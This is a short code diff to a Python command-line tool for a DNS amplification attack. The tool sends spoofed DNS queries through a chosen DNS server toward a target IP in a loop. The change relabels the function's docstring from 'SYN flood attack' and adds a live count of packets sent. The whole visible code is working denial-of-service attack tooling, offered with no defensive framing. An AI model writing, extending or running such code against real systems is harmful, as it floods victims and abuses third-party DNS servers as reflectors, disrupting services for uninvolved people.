@@ -35,7 +35,7 @@ query_type = [
 )
 @click.pass_context
 def dns_amplification(ctx, ip, dns_ip, count, mode):
-    """SYN flood attack"""
+    """DNS Amplification attack"""
     click.echo(
         "\n\n-------------------- DNS Amplification attack ---------------------\n"
     )
@@ -47,6 +47,7 @@ def dns_amplification(ctx, ip, dns_ip, count, mode):
         f"{mode} DNS Amplification attack on {ip} by DNS server {dns_ip} started!"
     )
 
+    num = 0
     for _ in range(count):
         for i in range(len(query_type)):
             packet = (
@@ -55,5 +56,6 @@ def dns_amplification(ctx, ip, dns_ip, count, mode):
                 / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
             )
             send(packet, verbose=0)
-
-    click.echo(f"{mode} Total {count * len(query_type)} packages sent\n")
+            click.clear()
+            click.echo(f"Total {num} packages sent\n")
+            num += 1
